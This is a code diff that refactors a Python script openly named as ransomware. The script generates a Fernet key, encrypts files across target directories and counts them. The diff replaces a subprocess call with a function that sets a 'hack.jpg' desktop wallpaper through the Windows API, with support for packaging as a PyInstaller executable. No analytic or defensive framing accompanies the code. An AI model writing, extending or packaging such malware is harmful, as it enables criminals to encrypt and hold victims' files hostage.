@@ -1,8 +1,21 @@
 import os
 from cryptography.fernet import Fernet
 import ctypes
-import subprocess
-def ransomware():
+import sys
+def set_wallpaper(file):
+    SPI_SETDESKWALLPAPER = 20
+    if hasattr(sys, "_MEIPASS"):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.dirname(os.path.abspath(__file__))
+    image_path = os.path.join(base_path, file)
+    ctypes.windll.user32.SystemParametersInfoW(
+        SPI_SETDESKWALLPAPER,
+        0,
+        image_path,
+        3
+    )
+def run_ransomware():
     key = Fernet.generate_key()
     cipher = Fernet(key)
     def encrypt_file(filepath):
@@ -44,14 +57,7 @@ def ransomware():
     for target in targets:
         if os.path.exists(target):
             total_encrypted += encrypt_directory(target)
-    wallpaper_code = '''
-    import ctypes
-    SPI_SETDESKWALLPAPER = 20
-    ctypes.windll.user32.SystemParametersInfoW(
-        SPI_SETDESKWALLPAPER,
-        0,
-        "image.jpg",
-        3
-    )
-    '''
-    subprocess.run(['python', '-c', wallpaper_code])
+    try:
+        set_wallpaper("hack.jpg")
+    except:
+        pass
